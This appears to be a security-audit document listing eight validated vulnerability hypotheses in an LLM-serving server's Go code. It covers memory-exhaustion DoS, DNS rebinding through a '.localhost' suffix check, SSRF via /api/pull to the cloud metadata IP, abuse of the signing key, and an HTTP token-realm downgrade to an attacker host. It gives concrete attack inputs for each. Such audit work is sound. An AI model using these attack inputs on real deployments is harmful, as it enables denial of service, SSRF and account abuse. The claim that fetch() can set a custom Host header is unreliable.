# Round 1 Hypotheses — Backward Reasoner (Pre-Mortem / Abductive)

## PH-01: Unbounded Body Buffering — Memory Exhaustion DoS via `/api/experimental/web_fetch`

**Reasoning model**: Pre-Mortem (what failure mode leads to OOM?)
**Target**: `server/cloud_proxy.go:294` — `readRequestBody` → `io.ReadAll(r.Body)`
**Attack input**: POST `/api/experimental/web_fetch` with a multi-gigabyte body (e.g. `Content-Length: 2147483648` and a slow streaming body, or chunked transfer with no `Content-Length`)
**Code path**: `WebFetchExperimentalHandler (routes.go:1962)` → `webExperimentalProxyHandler (routes.go:1966)` → `readRequestBody (cloud_proxy.go:289)` → `io.ReadAll(r.Body)` (cloud_proxy.go:294) — no MaxBytesReader wrapper
**Sanitizers on path**: None. The non-empty check at routes.go:1973 requires at least 1 non-space byte but does not limit size. `http.MaxBytesReader` is only applied in the `Content-Encoding: zstd` branch of `cloudPassthroughMiddleware`, which is a different code path.
**Security consequence**: An unauthenticated attacker (needs only to bypass `allowedHostsMiddleware`) can exhaust server RAM by streaming a large body. On a default loopback bind this requires bypassing host validation; on `OLLAMA_HOST=0.0.0.0` no bypass needed.
**Severity estimate**: HIGH (DoS; enables secondary attacks post-OOM)
**Status**: VALIDATED — confirmed by direct code inspection. No size limit exists on the non-zstd path.

---

## PH-02: Unbounded Body Buffering — Memory Exhaustion via `/v1/*` non-zstd POST

**Reasoning model**: Pre-Mortem
**Target**: `server/cloud_proxy.go:294` — `readRequestBody` → `io.ReadAll`
**Attack input**: POST `/v1/chat/completions` with large non-zstd body; `Content-Encoding` header absent
**Code path**: `cloudPassthroughMiddleware (cloud_proxy.go:72)` → zstd check at line 80 (fails, no zstd header) → `readRequestBody (line 96)` → `io.ReadAll(r.Body)` — unbounded
**Sanitizers on path**: MaxBytesReader only wraps the zstd-decoded reader (line 88-89). Non-zstd path has no equivalent.
**Security consequence**: OOM on any server that exposes `/v1/*` endpoints. Combined with the non-loopback bind bypass (G1) this is an unauthenticated remote OOM attack.
**Severity estimate**: HIGH
**Status**: VALIDATED — `readRequestBody` function has no MaxBytesReader; zstd cap is a dead letter for non-compressed bodies.

---

## PH-03: DNS Rebinding + client2 Middleware Skip — `/api/pull` SSRF

**Reasoning model**: Abductive (what attacker action best explains the gap in host validation?)
**Target**: `server/internal/registry/server.go:117-121` — `serveHTTP` dispatches before gin
**Attack input**: With `OLLAMA_EXPERIMENT=client2` set, POST `/api/pull {"model":"169.254.169.254/library/x:latest"}` via a browser page that has DNS-rebound `evil.com` to `127.0.0.1` (or directly on non-loopback bind)
**Code path**: HTTP request arrives → `registry.Local.ServeHTTP` → `serveHTTP` matches `/api/pull` → calls `s.handlePull(rec, r)` before gin chain — `allowedHostsMiddleware` never invoked → pull issues outbound HTTPS to `169.254.169.254`
**Sanitizers on path**: `parseNormalizePullModelRef` validates model name structure but not the host component against any allowlist. `regOpts.Insecure` defaults to caller-supplied value.
**Security consequence**: Outbound SSRF to any IP:port reachable from the server, including cloud IMDS. Error messages return portions of the response to the requester.
**Severity estimate**: HIGH (SSRF + auth middleware bypass combined)
**Status**: VALIDATED — `registry/server.go:117-121` confirms the gin chain is bypassed for `/api/pull` when client2 is active. `PullHandler` and `PullModel` have no host allowlist.

---

## PH-04: `.localhost` Suffix Bypass — DNS Rebinding from Public Web

**Reasoning model**: Abductive (what domain satisfies `strings.HasSuffix(host, ".localhost")`?)
**Target**: `server/routes.go:1600` — `allowedHost` suffix check
**Attack input**: Browser page at `http://attacker.localhost/` (served via attacker-controlled public DNS `attacker.localhost → victim's LAN IP`). Request carries `Host: attacker.localhost`.
**Code path**: TCP connection → `allowedHostsMiddleware` → `netip.ParseAddr("attacker.localhost")` fails (not an IP) → falls to `allowedHost` → `strings.HasSuffix("attacker.localhost", ".localhost")` → returns `true` → `c.Next()`
**Sanitizers on path**: None. RFC 6761 reserves `.localhost` for resolution to loopback, but the HTTP `Host` header is not DNS-resolved; any string ending in `.localhost` is accepted.
**Security consequence**: Full DNS rebinding attack from any web page that can set `Host: <name>.localhost` (trivial with `fetch()` API setting a custom `Host` header on CORS preflight). Reaches all API endpoints including inference, create, pull.
**Severity estimate**: HIGH
**Status**: VALIDATED — code at routes.go:1592-1603 is a raw `strings.HasSuffix` with no IP resolution.

---

## PH-05: Unauthenticated Signing Key Proxy via web_search/web_fetch

**Reasoning model**: Pre-Mortem
**Target**: `server/routes.go:1707-1708` — `WebSearchExperimentalHandler`/`WebFetchExperimentalHandler`
**Attack input**: Any request that bypasses `allowedHostsMiddleware` (via gaps 1-4 above); body `{"query": "attacker query"}` or any JSON accepted by ollama.com
**Code path**: POST `/api/experimental/web_search` → `webExperimentalProxyHandler` → `readRequestBody` → `proxyCloudRequestWithPath(c, body, "/api/web_search", ...)` → `signCloudProxyRequest` adds victim's ed25519 signature → outbound request to `ollama.com/api/web_search`
**Sanitizers on path**: `allowedHostsMiddleware` (bypassable via gaps 1-3). No local user authentication. No request content validation beyond non-empty check.
**Security consequence**: Attacker can perform arbitrary web searches/fetches billed to victim's ollama.com account. Rate limits applied per signing key, so victim's quota is consumed. Query content is exfiltrated through ollama.com logs (attacker controls the search term).
**Severity estimate**: HIGH
**Status**: VALIDATED — routes.go:1958-1978 confirms no auth; cloud_proxy.go:360-373 confirms signing happens for all ollama.com requests.

---

## PH-06: Public Key Oracle — Device Fingerprinting via `/api/me`

**Reasoning model**: Abductive
**Target**: `server/routes.go:1981-2010` — `WhoamiHandler`
**Attack input**: POST `/api/me` with empty body from any client that can reach the bind address
**Code path**: `WhoamiHandler` → `client.Whoami` (to ollama.com) → if user not signed in: `signinURL()` → `auth.GetPublicKey()` → returns base64-encoded public key in JSON response `{"error":"unauthorized","signin_url":"https://ollama.com/connect?name=<hostname>&key=<pubkey>"}`
**Sanitizers on path**: `allowedHostsMiddleware` (bypassable via gaps 1-3). No auth required.
**Security consequence**: Attacker can recover (a) the device's ollama.com public key (permanent device fingerprint, correlates across sessions), (b) the OS hostname. Combined with CSRF the attacker can forge `signin_url` to redirect victim to attacker-controlled sign-in page. Same disclosure occurs on `/api/generate` and `/api/chat` 401 paths.
**Severity estimate**: MEDIUM (public key exposure, not private key; enables phishing)
**Status**: VALIDATED — routes.go:1981-2010 confirmed; signinURL at routes.go:183-192 confirmed.

---

## PH-07: Registry Realm HTTPS Downgrade

**Reasoning model**: Pre-Mortem (what breaks if the registry sends HTTP Realm?)
**Target**: `server/auth.go:53-100` — `getAuthorizationToken`
**Attack input**: Attacker controls a registry (or MITM intercepts registry 401 response); sets `WWW-Authenticate: Bearer realm="http://evil.example.com/token",service="evil.example.com",scope="..."`
**Code path**: `getAuthorizationToken` → `challenge.URL()` → `url.Parse("http://evil.example.com/token")` → host equality check passes only if `originalHost == "evil.example.com"` (which it will be if attacker controlled the pull target) → `makeRequest(ctx, GET, redirectURL, ...)` → outbound HTTP request to attacker's token endpoint → attacker receives `auth.Sign`-generated ed25519 signature over the challenge data
**Sanitizers on path**: Host equality check at auth.go:61 prevents cross-host token sends. But if the original registry host IS attacker-controlled (e.g., via `POST /api/pull {"model":"evil.com/model:latest"}`), the host check passes and the scheme downgrade to HTTP succeeds. The signature is sent over cleartext.
**Security consequence**: ed25519 signature leaks to attacker over HTTP MITM; signature is over `GET,<url>,<sha256>` format which limits replay utility, but the nonce + timestamp in the URL make the format attacker-observable.
**Severity estimate**: MEDIUM
**Status**: VALIDATED — auth.go:53-100 confirms no scheme enforcement; combination with SSRF (PH-03) makes this reachable.

---

## PH-08: RawQuery Injection into Cloud Proxy

**Reasoning model**: Abductive
**Target**: `server/cloud_proxy.go:191-194` — `proxyCloudRequestWithPath`
**Attack input**: POST `/v1/chat/completions?_debug=1&override_model=gpt-4` (arbitrary query parameters)
**Code path**: `proxyCloudRequestWithPath` → `targetURL := baseURL.ResolveReference(&url.URL{Path: path, RawQuery: c.Request.URL.RawQuery})` → outbound request to `https://ollama.com/v1/chat/completions?_debug=1&override_model=gpt-4&ts=<timestamp>`
**Sanitizers on path**: None. `RawQuery` is forwarded verbatim. ollama.com's server-side behavior determines impact.
**Security consequence**: Attacker can inject arbitrary query parameters into ollama.com API calls. Impact depends on ollama.com's query parameter handling (could affect rate limiting keys, feature flags, debug modes). Low-severity on its own but a reliable primitive for server-side parameter injection.
**Severity estimate**: MEDIUM (depends on ollama.com backend behavior)
**Status**: VALIDATED — cloud_proxy.go:193-194 confirmed.
